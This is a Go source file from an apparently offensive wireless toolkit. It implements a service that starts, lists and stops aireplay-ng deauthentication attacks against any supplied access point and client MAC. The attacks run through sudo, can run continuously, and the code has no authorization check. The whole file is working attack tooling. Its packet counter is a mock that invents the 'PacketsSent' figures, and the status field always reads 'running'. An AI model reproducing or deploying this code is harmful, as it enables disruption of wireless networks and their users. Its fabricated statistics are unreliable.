package aireplay

import (
	"context"
	"fmt"
	"os/exec"
	"sync"
	"time"

	"github.com/phantoma/server/internal/service/wireless"
)

// Service manages aireplay-ng deauthentication attacks.
type Service struct {
	executor    *wireless.CommandExecutor
	currentAttacks map[string]*ActiveAttack
	mu          sync.RWMutex
}

// ActiveAttack represents a running deauth attack.
type ActiveAttack struct {
	ID          string
	Request     DeauthRequest
	StartTime   time.Time
	Process     *exec.Cmd
	CancelFunc  context.CancelFunc
	PacketsSent int
	Done        chan bool
}

// NewService creates a new aireplay service.
func NewService() *Service {
	return &Service{
		executor:       wireless.NewCommandExecutor(true, 0),
		currentAttacks: make(map[string]*ActiveAttack),
	}
}

// StartDeauth begins a deauthentication attack.
func (s *Service) StartDeauth(req DeauthRequest) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Validate inputs
	if req.Interface == "" {
		return "", fmt.Errorf("interface is required")
	}
	if req.BSSID == "" {
		return "", fmt.Errorf("BSSID is required")
	}
	if !ValidateBSSID(req.BSSID) {
		return "", fmt.Errorf("invalid BSSID format")
	}
	if req.Channel < 1 || req.Channel > 165 {
		req.Channel = 6 // default channel
	}
	if req.Count == 0 {
		req.Count = 0 // 0 = continuous
	}

	attackID := fmt.Sprintf("deauth_%d", time.Now().UnixNano())

	// Build command
	// aireplay-ng -0 <count> -a <BSSID> [-c <clientMAC>] <interface>
	args := []string{
		"aireplay-ng",
		"-0", fmt.Sprintf("%d", req.Count),
		"-a", req.BSSID,
	}

	if req.ClientMAC != "" {
		args = append(args, "-c", req.ClientMAC)
	}
	args = append(args, req.Interface)

	ctx, cancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(ctx, "sudo", args...)

	if err := cmd.Start(); err != nil {
		cancel()
		return "", fmt.Errorf("failed to start aireplay-ng: %w", err)
	}

	attack := &ActiveAttack{
		ID:         attackID,
		Request:    req,
		StartTime:  time.Now(),
		Process:    cmd,
		CancelFunc: cancel,
		Done:       make(chan bool),
	}

	s.currentAttacks[attackID] = attack

	// Start output parser in background
	go s.monitorAttack(attack)

	return attackID, nil
}

// StopDeauth terminates a deauth attack.
func (s *Service) StopDeauth(attackID string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return fmt.Errorf("attack not found: %s", attackID)
	}

	attack.CancelFunc()
	<-attack.Done

	delete(s.currentAttacks, attackID)
	return nil
}

// GetAttackStatus returns the status of an attack.
func (s *Service) GetAttackStatus(attackID string) (*DeauthAttack, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return nil, fmt.Errorf("attack not found: %s", attackID)
	}

	return &DeauthAttack{
		ID:         attack.ID,
		Interface:  attack.Request.Interface,
		BSSID:      attack.Request.BSSID,
		ClientMAC:  attack.Request.ClientMAC,
		Channel:    attack.Request.Channel,
		Count:      attack.Request.Count,
		StartTime:  attack.StartTime,
		Status:     "running",
		PacketsSent: attack.PacketsSent,
	}, nil
}

// ListAttacks returns all active attacks.
func (s *Service) ListAttacks() []DeauthAttack {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attacks := make([]DeauthAttack, 0, len(s.currentAttacks))
	for _, attack := range s.currentAttacks {
		attacks = append(attacks, DeauthAttack{
			ID:         attack.ID,
			Interface:  attack.Request.Interface,
			BSSID:      attack.Request.BSSID,
			ClientMAC:  attack.Request.ClientMAC,
			Channel:    attack.Request.Channel,
			Count:      attack.Request.Count,
			StartTime:  attack.StartTime,
			Status:     "running",
			PacketsSent: attack.PacketsSent,
		})
	}
	return attacks
}

// monitorAttack tracks packet count and process completion.
func (s *Service) monitorAttack(attack *ActiveAttack) {
	defer close(attack.Done)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	// Channel to wait for process exit
	done := make(chan error)
	go func() {
		done <- attack.Process.Wait()
	}()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			// In a real implementation, we would parse process output
			// For now, increment mock counter
			attack.PacketsSent += 10 // approximate
		}
	}
}